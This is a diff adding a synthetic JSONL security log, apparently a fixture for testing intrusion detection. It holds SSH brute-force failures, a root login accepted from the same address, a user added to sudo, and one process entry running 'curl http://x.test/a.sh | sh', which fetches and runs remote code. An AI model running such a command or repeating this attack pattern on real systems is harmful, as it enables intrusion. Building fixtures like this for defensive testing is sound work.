@@ -1,0 +1,14 @@
+{"time": 1700000000, "event": "ssh_failed", "src_ip": "203.0.113.9", "user": "admin"}
+{"time": 1700000020, "event": "ssh_failed", "src_ip": "203.0.113.9", "user": "admin"}
+{"time": 1700000040, "event": "ssh_failed", "src_ip": "203.0.113.9", "user": "admin"}
+{"time": 1700000060, "event": "ssh_failed", "src_ip": "203.0.113.9", "user": "admin"}
+{"time": 1700000080, "event": "ssh_failed", "src_ip": "203.0.113.9", "user": "admin"}
+{"time": 1700000100, "event": "ssh_failed", "src_ip": "203.0.113.9", "user": "admin"}
+{"time": 1700000000, "event": "ssh_failed", "src_ip": "198.51.100.4", "user": "bob"}
+{"time": 1700000040, "event": "ssh_failed", "src_ip": "198.51.100.4", "user": "bob"}
+{"time": 1700000080, "event": "ssh_failed", "src_ip": "198.51.100.4", "user": "bob"}
+{"time": "2023-11-14T22:30:00Z", "event": "ssh_accepted", "src_ip": "203.0.113.9", "user": "root"}
+{"time": "2023-11-14T22:31:00Z", "event": "ssh_accepted", "src_ip": "10.0.0.5", "user": "root"}
+{"time": 1700000500, "event": "process_start", "process": {"cmdline": "bash -c 'curl http://x.test/a.sh | sh'"}}
+{"time": 1700000600, "event": "group_member_added", "group": "sudo", "user": "mallory"}
+{"time": 1700000601, "event": "group_member_added", "group": "users", "user": "alice"}
